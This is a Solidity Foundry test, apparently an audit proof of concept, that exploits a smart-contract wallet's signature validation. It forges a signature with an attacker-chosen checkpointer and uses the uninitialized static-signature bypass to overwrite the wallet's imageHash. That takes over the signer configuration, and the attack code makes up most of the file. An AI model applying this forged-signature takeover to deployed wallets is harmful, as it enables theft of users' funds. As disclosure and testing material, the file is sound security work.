// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/integrations/extensions/sessions/ExtendedSessionTestBase.sol";
import "../src/Factory.sol";
import "../src/Stage1Module.sol";
import "../src/modules/Payload.sol";
import "../src/modules/auth/BaseAuth.sol";

// ATTACK TIMELINE:
// 1. [Setup] Deploy protocol via ExtendedSessionTestBase, create a Wallet with default topology.
// 2. [T=0] Attacker observes that the Wallet's static signature is uninitialized, returning (address(0), 0).
// 3. [T=1] Attacker crafts a payload to call updateImageHash(attackerImageHash) on the Wallet.
// 4. [T=2] Attacker submits the payload via execute() with a forged signature containing their own checkpointer address.
// 5. [T=3] The signatureValidation logic checks the static signature. Since addr == address(0), the caller check is bypassed.
// 6. [T=4] The recover function reads the attacker's checkpointer from the signature bytes (not covered by hash) and accepts it.
// 7. [Assert] Verify the Wallet's imageHash has been maliciously updated to the attacker's chosen hash.

contract AuditAgentPoC is ExtendedSessionTestBase {
    address public attacker = address(0xdead);
    bytes32 public attackerImageHash = bytes32(uint256(0x1337));

    function test_exploit() public {
        // 1. Create a Wallet with default topology
        string memory topology = _createDefaultTopology();
        (Stage1Module targetWallet, string memory config, bytes32 originalImageHash) = _createWallet(topology);

        console.log("Step 1: Original imageHash =", uint256(originalImageHash));

        // 2. Verify static signature is uninitialized (address(0))
        BaseAuth authWallet = BaseAuth(address(targetWallet));
        (address staticAddr, uint256 staticTimestamp) = authWallet.getStaticSignature(bytes32(0));
        assertEq(staticAddr, address(0), "Static signature should be uninitialized (address(0))");
        console.log("Step 2: Static signature address is address(0), bypass enabled");

        // 3. Craft payload to update imageHash
        Payload.Call[] memory calls = new Payload.Call[](1);
        calls[0] = Payload.Call({
            to: address(targetWallet),
            value: 0,
            data: abi.encodeWithSelector(BaseAuth.updateImageHash.selector, attackerImageHash),
            delegateCall: false,
            onlyFallback: false,
            behaviorOnError: Payload.BehaviorOnError.REVERT
        });

        Payload.Decoded memory payload = Payload.Decoded({
            space: 0,
            nonce: 0,
            calls: calls,
            selfCall: true
        });

        bytes memory packedPayload = PrimitivesRPC.toPackedPayload(vm, payload);

        // 4. Forge signature with attacker's checkpointer address
        // The checkpointer address is read from signature bytes and not covered by the signed hash.
        // Because static signature returns address(0), the caller check `if (addr != address(0) && addr != msg.sender)` is bypassed.
        bytes memory forgedSignature = abi.encodePacked(
            uint8(0), // Signature type / tree depth
            attacker, // Forged checkpointer address (H0)
            bytes32(0), // Dummy signature data
            bytes32(0)
        );

        console.log("Step 4: Attacker submitting forged payload with checkpointer =", attacker);

        // 5. Execute the attack
        vm.prank(attacker);
        targetWallet.execute(packedPayload, forgedSignature);

        // 6. Assert the imageHash was successfully updated by the attacker
        bytes32 currentImageHash = authWallet.imageHash();
        console.log("Step 6: Current imageHash =", uint256(currentImageHash));

        assertEq(currentImageHash, attackerImageHash, "Attacker successfully forged checkpointer and updated imageHash");
        assertNotEq(currentImageHash, originalImageHash, "Wallet signer configuration is fully compromised");
    }
}
